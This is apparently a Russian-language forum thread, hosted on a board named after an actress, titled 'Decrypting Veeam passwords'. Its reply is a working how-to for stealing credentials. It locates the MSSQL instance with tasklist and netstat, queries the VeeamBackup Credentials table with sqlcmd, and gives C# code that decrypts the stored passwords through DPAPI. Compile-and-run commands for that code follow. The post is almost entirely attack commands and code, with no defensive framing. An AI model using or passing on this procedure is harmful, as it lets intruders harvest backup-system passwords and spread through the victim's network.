@@ -1,0 +1,134 @@
+
+
+    Vampir
+    Новые темы
+    Новые ответы
+
+    Начало
+    Помощь
+    Поиск
+    Профиль
+    Личные сообщения
+    Пользователи
+
+Monica Bellucci Fan Club
+
+    Monica Bellucci Fan Club »
+    Software and Technologies »
+    Backup Solutions »
+    Decrypting Veeam passwords
+
+Decrypting Veeam passwords
+Alter · 2 · 61
+« предыдущая тема следующая тема »
+
+Страницы: 1
+Alter
+
+    Administrator
+    Member
+    *****
+        28
+        Просмотр профиля Личное сообщение (Оффлайн) 
+
+: Февраля 05, 2021, 01:25:02 pm
+Записан
+
+Post
+
+Rozetka
+
+    Administrator
+    Member
+    *****
+        35
+        Просмотр профиля E-mail Личное сообщение (Оффлайн) 
+
+Ответ #1 : Февраля 11, 2021, 02:41:29 pm
+Записан
+
+edited by rz >
+
+tasklist /v (ищем sqlservr и ПИД в нетстат.ано, ищем порт в нетстате по ПИДу)
+netstat -ano
+Ищешь порт MsSQL по PID  в 2-х выводах
+ищешь где лежит sqlcmd.exe
+
+Цитировать
+
+    "c:\Program Files\Microsoft SQL Server\110\Tools\Binn\sqlcmd.exe" -S localhost,найденный_порт -E -y0 -Q "SELECT TOP (1000) [id],[user_name],[password],[usn],[description],[visible],[change_time_utc]FROM [VeeamBackup].[dbo].[Credentials];"
+
+
+опция -y0 обязательно иначе sqlcmd режет вывод
+
+дальше берёшь вот такой код
+
+Цитировать
+
+    using System;
+    using System.Collections.Generic;
+    using System.Security.Cryptography;
+    using System.Text;
+
+    namespace Main
+    {
+    internal static class Program
+       {
+       private static void Decrypt(string b,string a){
+          if (string.IsNullOrEmpty(a))
+          {
+             return;
+          }
+          byte[] encryptedData = Convert.FromBase64String(a);
+          Console.WriteLine(b+':'+Encoding.UTF8.GetString(ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.LocalMachine)));      
+          return;
+       }
+       private static void Main(string[] args)
+          {
+             Decrypt("необязательный юзернейм","тут хэш из вывода sqlcmd");
+          }
+     }
+    }
+
+на каждый хэш отдельный вызов функции Decrypt
+Создаёшь файл
+c:\Windows\Microsoft.NET\Framework\v4.0.30319\veeam1.cs
+Код который выше кладёшь в veeam1.cs
+Открываешь CMD
+Переходишь в диру
+Цитировать
+
+    cd C:\Windows\Microsoft.NET\Framework\v4.0.30319\
+
+Далее билдишь EXE вот так:
+Цитировать
+
+    c:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe veeam1.cs
+
+
+Выполянешь на машине с виамом ИЗ ПОД CMD(он в cmd выплёывает пароль)
+Цитировать
+
+    c:\Windows\Microsoft.NET\Framework\v4.0.30319\veeam1.exe
+
+На выходе получаем пароль
+
+All credits xuz
+
+fixed by rz
+
+Страницы: 1
+
+    Monica Bellucci Fan Club »
+    Software and Technologies »
+    Backup Solutions »
+    Decrypting Veeam passwords
+
+Перейти в:
+ 
++ Быстрый ответ
+
+    SMF 2.0.18 | SMF © 2020, Simple Machines
+    Разработанно с от SychO
+
+
